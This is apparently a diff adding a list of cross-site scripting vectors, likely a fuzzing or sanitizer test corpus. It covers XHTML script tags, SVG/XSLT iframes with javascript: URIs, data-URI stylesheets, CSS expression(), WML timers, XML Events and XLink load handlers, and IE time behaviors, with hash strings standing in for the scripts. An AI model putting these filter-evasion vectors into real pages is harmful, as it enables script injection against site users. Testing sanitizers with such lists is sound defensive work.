+<?xml version="1.0"?><html:html xmlns:html='http://www.w3.org/1999/xhtml'><html:script>5a26eb2faf9238b983a11bb02501b43a;</html:script></html:html>
+<?xml version="1.0"?><html:html xmlns:html='http://www.w3.org/1999/xhtml'><html:script>javascript:b135ebe2d4522db9cf91426f430eff46;</html:script></html:html>
+<?xml version="1.0" standalone="no"?> <html xmlns="http://www.w3.org/1999/xhtml"> <head> <style type="text/css"> @font-face {font-family: y; src: url("d20177da373cbae9db21b5bf854d0671#x") format("svg");} body {font: 100px "y";} </style> </head> <body>X</body> </html>
+<?xml version="1.0"?> <?xml-stylesheet type="text/xml" href="#stylesheet"?> <!DOCTYPE doc [ <!ATTLIST xsl:stylesheet id ID #REQUIRED>]> <svg xmlns="http://www.w3.org/2000/svg"> <xsl:stylesheet id="stylesheet" version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"> <xsl:template match="/"> <iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:f84baf6f6266785d2e127bdfc527c579"></iframe> </xsl:template> </xsl:stylesheet> <circle fill="red" r="40"></circle> </svg>
+<?xml version="1.0"?> <?xml-stylesheet type="text/xsl" href="data:,%3Cxsl:transform version='1.0' xmlns:xsl='http://www.w3.org/1999/XSL/Transform' id='X'%3E%3Cxsl:output method='html'/%3E%3Cxsl:template match='/'%3E%3Cscript%3Edbea12f5e6ab2c4410c33f865f4bba58%3C/script%3E%3C/xsl:template%3E%3C/xsl:transform%3E"?> <root/>
+<X STYLE="X:expression(1050eab76def302840fbf113e86889a7)">
+<x:template xmlns:x="http://www.wapforum.org/2001/wml" x:ontimer="$(x:unesc)j$(y:escape)a$(z:noecs)v$(x)a$(y)s$(z)cript$x:4dade8e5aecf55c9b1384d90131fbd26"><x:timer value="1"/></x:template>
+<x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="7df3d7f91560a101d2d0ce38e33eb1b7#x"/>
+<x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="javascript:16f3a5a3535d273cccdbac76a31219fe//#x"/>
+<x xmlns:xlink="http://www.w3.org/1999/xlink" xlink:actuate="onLoad" xlink:href="javascript:1fe266e86a12210d5973486b7f40935b" xlink:type="simple"/>
+X<x style=`behavior:url(#default#time2)` onbegin=`ddd8a31e0ced17edfc9d28ea32591844` >
+X<x style=`behavior:url(#default#time2)` onbegin=`javascript:8fae2735c20e0aa787363cd42f8be5ca` >
